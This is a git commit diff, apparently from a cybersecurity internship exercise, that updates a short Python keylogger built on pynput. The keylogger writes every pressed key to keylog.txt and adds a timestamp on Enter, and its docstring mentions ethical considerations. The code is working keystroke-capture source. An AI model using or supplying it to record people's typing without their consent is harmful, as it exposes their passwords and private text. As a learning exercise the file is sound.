d8e11f46fa9fe62c677ac2a17951d402f4237e8d
Pavankarimajji <162949907+Pavankarimajji@users.noreply.github.com>
2024-08-12 12:29:08 +0530

    Update PRODIGY_CS_4.py

--- Prodigy_CS_04/PRODIGY_CS_4.py
+++ Prodigy_CS_04/PRODIGY_CS_4.py
@@ -6,20 +6,21 @@ Focus on logging the keys pressed and saving them to a file.
 Note: Ethical considerations and permissions are crucial for 
 projects involving keyloggers.
 '''
-
 from pynput import keyboard
 import time
 
 def on_key_press(key):
-    log_file = open("keylog.txt", "a")
-    timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
-    log_file.write(f"{timestamp} - {key}\n")
-    log_file.close()
+        log_file = open("keylog.txt","a")
+        timestamp = time.strftime("%H:%M:%S",time.localtime())
+        log_file.write(f"{key }")
+        if key==keyboard.Key.enter:
+                log_file.write(f" {timestamp}\n")
+        log_file.close()
 
 def main():
-    print("Press Ctrl+C to stop logging.")
-    with keyboard.Listener(on_press=on_key_press) as listener:
-        listener.join()
+        print('press Ctrl+C to stop logging')
+        with keyboard.Listener(on_press=on_key_press) as listener:
+                listener.join()
 
 if __name__ == "__main__":
-    main()
+        main()
